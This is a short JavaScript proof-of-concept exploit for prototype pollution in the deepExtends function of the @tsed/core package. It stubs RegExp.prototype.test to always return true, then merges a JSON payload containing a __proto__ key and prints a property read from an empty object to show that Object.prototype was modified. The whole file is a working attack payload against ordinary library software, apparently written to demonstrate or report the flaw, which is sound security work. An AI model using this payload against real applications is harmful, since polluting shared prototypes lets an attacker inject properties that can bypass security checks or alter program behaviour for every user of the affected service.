RegExp.prototype.test = () => true;
const {deepExtends} = require('@tsed/core');
const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
let obj = {};
console.log({}.polluted);
let result = deepExtends({ security: [{ 1: 'o' }] }, payload);
console.log({}.polluted);